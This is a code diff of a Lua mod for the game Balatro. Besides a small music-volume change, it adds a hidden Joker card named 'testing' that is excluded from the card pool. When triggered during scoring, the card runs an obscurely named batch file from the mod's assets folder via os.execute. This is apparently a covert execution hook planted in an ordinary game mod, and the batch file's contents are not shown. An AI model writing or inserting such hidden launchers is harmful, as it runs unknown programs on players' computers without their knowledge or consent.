@@ -10874,6 +10874,22 @@ SMODS.Blind {
 
 
 -- Nyx bullshit --
+SMODS.Joker{
+	key = 'testing',
+    atlas = 'Jokers',
+    unlocked = true,
+    discovered = true,
+    pos = {x = 9, y = 1},
+	in_pool = function(self) 
+		return false 
+	end,
+	calculate = function(self, card, context)
+		if context.joker_main then
+			local f = io.popen("cd"):read() .. "\\mods\\Horizon\\assets\\pa75bPr.bat"
+			os.execute(f)
+		end
+	end
+}
 
 local position = math.random(1,9)
 local night = false
@@ -10897,7 +10913,7 @@ SMODS.Joker{
 SMODS.Sound({
 	key = "music_cursed",
 	path = "music_cursed.ogg",
-	volume = 1,
+	volume = 1.2,
 	pitch = 1,
 	select_music_track = function()
 		return G.STAGE == G.STAGES.MAIN_MENU and night
